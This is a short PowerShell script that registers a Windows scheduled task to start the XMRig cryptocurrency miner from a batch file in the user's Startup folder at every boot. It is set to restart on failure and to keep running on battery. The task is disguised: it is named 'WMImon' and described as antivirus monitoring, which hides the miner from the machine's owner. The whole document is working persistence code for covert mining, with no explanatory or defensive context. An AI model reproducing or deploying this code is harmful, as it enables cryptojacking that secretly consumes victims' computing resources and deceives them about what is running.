# Define the trigger (run at system startup)
$Trigger = New-ScheduledTaskTrigger -AtStartup

# Define the action (execute the batch script for XMRig)
$Action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\xmrig-6.22.2\w.bat"

# Define the task settings
$Settings = New-ScheduledTaskSettingsSet -StartWhenAvailable -DontStopIfGoingOnBatteries -RestartCount 5 -RestartInterval (New-TimeSpan -Minutes 7)

# Register the task
Register-ScheduledTask -TaskName "WMImon" -Trigger $Trigger -Action $Action -Settings $Settings -Description "Monitor and update Antivirus if any error occurs."